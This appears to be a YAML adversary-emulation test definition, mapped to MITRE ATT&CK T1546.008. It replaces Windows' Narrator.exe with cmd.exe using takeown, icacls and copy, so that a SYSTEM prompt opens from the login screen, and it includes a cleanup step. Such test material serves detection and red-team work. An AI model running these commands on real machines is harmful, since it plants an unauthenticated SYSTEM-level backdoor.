- id: 15a8c337-7885-5cac-bd45-5e03fcc4ec06
  name: Soumaia ART Tests - Replace Narrator.exe (Narrator binary) with cmd.exe
  description: Replace Narrator.exe (Narrator binary) with cmd.exe. This allows the user to launch an elevated command prompt by toggling on the Narrator button from the Accessibility menu on the login screen. (requires elevation)
  tactic: privilege-escalation
  technique:
    attack_id: T1546.008
    name: 'Event Triggered Execution: Accessibility Features'
  platforms:
    windows:
      cmd:
        command: |-
          IF NOT EXIST C:\Windows\System32\Narrator_backup.exe (copy C:\Windows\System32\Narrator.exe C:\Windows\System32\Narrator_backup.exe) ELSE ( pushd )
          takeown /F C:\Windows\System32\Narrator.exe /A
          icacls C:\Windows\System32\Narrator.exe /grant Administrators:F /t
          copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\Narrator.exe
        cleanup: |-
          copy /Y C:\Windows\System32\Narrator_backup.exe C:\Windows\System32\Narrator.exe
